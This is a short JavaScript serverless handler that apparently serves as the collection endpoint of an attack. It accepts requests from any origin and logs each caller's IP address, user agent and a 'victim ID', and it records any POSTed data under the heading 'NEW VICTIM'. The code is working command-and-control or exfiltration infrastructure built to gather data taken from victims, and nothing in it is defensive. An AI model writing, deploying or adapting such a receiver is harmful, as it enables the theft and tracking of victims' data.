export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'GET') {
    const timestamp = new Date().toISOString();
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const victimId = req.query.v || 'unknown';
    
    console.log('NEW VICTIM (GET)');
    console.log('Time:', timestamp);
    console.log('IP:', ip);
    console.log('Victim ID:', victimId);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('---');
    
    return res.status(200).json({
      status: 'online',
      received: timestamp,
      id: victimId
    });
  }
  
  if (req.method === 'POST') {
    try {
      const data = req.body;
      const timestamp = new Date().toISOString();
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      
      console.log('NEW VICTIM (POST)');
      console.log('Time:', timestamp);
      console.log('IP:', ip);
      console.log('Data:', JSON.stringify(data, null, 2));
      console.log('---');
      
      return res.status(200).json({
        ok: true,
        received: timestamp
      });
      
    } catch (error) {
      console.error('Error:', error);
      return res.status(200).json({ok: true});
    }
  }
  
  return res.status(405).json({error: 'Method not allowed'});
}
